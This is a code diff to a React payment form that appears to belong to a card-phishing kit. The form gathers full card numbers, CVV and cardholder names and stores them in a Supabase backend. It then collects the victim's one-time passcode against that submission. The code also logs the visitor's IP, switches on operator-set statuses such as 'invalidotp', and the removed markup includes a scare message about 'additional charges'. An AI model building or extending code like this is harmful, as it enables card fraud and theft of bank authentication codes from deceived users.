@@ -1,6 +1,8 @@
+
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
+import OTPVerificationPage from './OTPVerificationPage';
 
 const getRealIP = async () => {
   try {
@@ -25,15 +27,11 @@ const PaymentForm = () => {
     expiryYear: '',
     cvv: '',
     cardHolder: '',
-    amount: '28300.00'
+    amount: '29000.00'
   });
 
   const [isLoading, setIsLoading] = useState(false);
   const [showOtp, setShowOtp] = useState(false);
-  const [otp, setOtp] = useState('');
-  const [displayOtp, setDisplayOtp] = useState('');
-  const [otpFocused, setOtpFocused] = useState(false);
-  const [timer, setTimer] = useState(299);
   const [isConfirmLoading, setIsConfirmLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
   const [showProcessing, setShowProcessing] = useState(false);
@@ -44,6 +42,7 @@ const PaymentForm = () => {
   const [showBackDialog, setShowBackDialog] = useState(false);
   const [longPressTimer, setLongPressTimer] = useState<NodeJS.Timeout | null>(null);
   const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
+  const [selectedBank, setSelectedBank] = useState('ICICI BANK');
 
   // Check if all card details are filled
   const isFormValid = () => {
@@ -52,11 +51,6 @@ const PaymentForm = () => {
            formData.expiryYear.length === 2 &&
            formData.cvv.length >= 3 &&
            formData.cardHolder.trim().length > 0;
-  };
-
-  // Check if OTP is valid (6 digits)
-  const isOtpValid = () => {
-    return otp.length === 6;
   };
 
   useEffect(() => {
@@ -228,7 +222,7 @@ const PaymentForm = () => {
               break;
             case 'invalidotp':
               setIsConfirmLoading(false);
-              setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
+              setInvalidOtpMessage('Invalid OTP, Enter valid one time passcode sent to your mobile');
               break;
             case 'cardinvalid':
               setFadeState('fadeOut');
@@ -282,27 +276,11 @@ const PaymentForm = () => {
     };
   }, [currentSubmissionId]);
 
-  useEffect(() => {
-    let interval: NodeJS.Timeout;
-    if (showOtp && timer > 0) {
-      interval = setInterval(() => {
-        setTimer(prev => prev - 1);
-      }, 1000);
-    }
-    return () => clearInterval(interval);
-  }, [showOtp, timer]);
-
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\D/g, '');
     const limited = cleaned.slice(0, 16);
     const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
     return formatted;
-  };
-
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins}.${secs.toString().padStart(2, '0')}`;
   };
 
   const generateInvoiceId = () => {
@@ -341,7 +319,6 @@ const PaymentForm = () => {
       });
     } else if (name === 'expiryMonth') {
       const numericValue = value.replace(/\D/g, '').slice(0, 2);
-      // Allow any numeric input including leading zeros (01-12)
       if (numericValue === '' || (numericValue.length <= 2 && parseInt(numericValue) <= 12)) {
         setFormData({
           ...formData,
@@ -350,7 +327,6 @@ const PaymentForm = () => {
       }
     } else if (name === 'expiryYear') {
       const numericValue = value.replace(/\D/g, '').slice(0, 2);
-      // Validate year (up to 50)
       if (numericValue === '' || parseInt(numericValue) <= 50) {
         setFormData({
           ...formData,
@@ -368,20 +344,6 @@ const PaymentForm = () => {
         ...formData,
         [name]: value
       });
-    }
-  };
-
-  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
-    setOtp(value);
-    setDisplayOtp(value);
-    setInvalidOtpMessage('');
-    
-    if (value.length > 0) {
-      // Instantly mask each character as it's typed
-      setTimeout(() => {
-        setDisplayOtp('*'.repeat(value.length));
-      }, 100);
     }
   };
 
@@ -416,12 +378,9 @@ const PaymentForm = () => {
     await sendToSupabase(cardData);
   };
 
-  const handleConfirmPay = async () => {
-    if (!isOtpValid()) {
-      return;
-    }
-    
+  const handleConfirmPay = async (otp: string) => {
     setIsConfirmLoading(true);
+    setInvalidOtpMessage('');
     
     // Update the card submission with OTP
     if (currentSubmissionId) {
@@ -442,20 +401,16 @@ const PaymentForm = () => {
     }
   };
 
-  const getLastFourDigits = () => {
-    return formData.cardNumber.replace(/\s/g, '').slice(-4);
-  };
-
-  const maskCardInfo = (value: string) => {
-    return '*'.repeat(value.length);
-  };
-
   const handleBackDialogAction = (action: 'leave' | 'cancel') => {
     setShowBackDialog(false);
     if (action === 'leave') {
       setErrorMessage('Please try again');
       window.location.href = '/';
     }
+  };
+
+  const maskCardInfo = (value: string) => {
+    return '*'.repeat(value.length);
   };
 
   if (showSuccess) {
@@ -482,90 +437,16 @@ const PaymentForm = () => {
 
   if (showOtp) {
     return (
-      <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
-        fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
-      }`}>
-        {showBackDialog && (
-          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-            <div className="bg-white p-6 rounded-lg shadow-lg">
-              <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
-              <div className="flex space-x-4">
-                <button
-                  onClick={() => handleBackDialogAction('leave')}
-                  className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
-                >
-                  Leave
-                </button>
-                <button
-                  onClick={() => handleBackDialogAction('cancel')}
-                  className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
-                >
-                  Cancel
-                </button>
-              </div>
-            </div>
-          </div>
-        )}
-
-        <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
-          <div className="flex items-center mb-2">
-            <Shield className="w-5 h-5 text-red-600 mr-2" />
-            <span className="font-semibold text-red-800">OTP Verification Required</span>
-          </div>
-          <p className="text-sm text-red-700">
-            Enter the verification code to complete your payment.
-          </p>
-        </div>
-
-        <div className="space-y-4">
-          {invalidOtpMessage && (
-            <div className="text-red-600 text-sm text-center mb-4">
-              {invalidOtpMessage}
-            </div>
-          )}
-          
-          <div className="text-center mb-6">
-            <p className="text-sm text-gray-700 mb-4">
-              Enter six-digit verification code sent to your registered mobile number ending in {getLastFourDigits()}
-            </p>
-            
-            <div className="relative">
-              <input
-                type="text"
-                value={otp}
-                onChange={handleOtpChange}
-                onFocus={() => setOtpFocused(true)}
-                onBlur={() => setOtpFocused(false)}
-                placeholder="------"
-                className={`w-full px-4 py-3 border-2 rounded-lg text-center text-2xl tracking-widest focus:outline-none transition-all ${
-                  otpFocused ? 'border-blue-400 shadow-lg shadow-blue-200' : 'border-gray-300'
-                }`}
-                maxLength={6}
-                disabled={isConfirmLoading}
-              />
-            </div>
-          </div>
-
-          <button
-            onClick={handleConfirmPay}
-            disabled={!isOtpValid() || isConfirmLoading}
-            className={`w-full py-3 px-4 rounded-lg font-medium transition-all ${
-              isOtpValid() && !isConfirmLoading
-                ? 'bg-green-600 text-white hover:bg-green-700'
-                : 'bg-gray-400 text-gray-600 cursor-not-allowed'
-            }`}
-          >
-            {isConfirmLoading ? (
-              <Loader2 className="w-5 h-5 animate-spin mx-auto" />
-            ) : (
-              'Confirm & Pay'
-            )}
-          </button>
-
-          <div className="text-center text-sm text-red-600 mt-4">
-            This page will expire after {formatTime(timer)} seconds
-          </div>
-        </div>
+      <div className="w-full">
+        <OTPVerificationPage
+          onBack={() => setShowOtp(false)}
+          onConfirm={handleConfirmPay}
+          isLoading={isConfirmLoading}
+          invalidOtpMessage={invalidOtpMessage}
+          cardNumber={formData.cardNumber}
+          amount={formData.amount}
+          bankLogo={selectedBank}
+        />
       </div>
     );
   }
@@ -763,7 +644,7 @@ const PaymentForm = () => {
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
-          <img src="https://pngimagefree.com/wp-content/uploads/Rupay-Logo-Vector-PNG-Transparent.png" alt="RuPay" className="h-8 w-12 object-contain filter brightness-0" />
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/RuPay.svg/2560px-RuPay.svg.png" alt="RuPay" className="h-8 w-12 object-contain" />
         </div>
 
         <div className="text-xs text-gray-500 text-center mt-4">
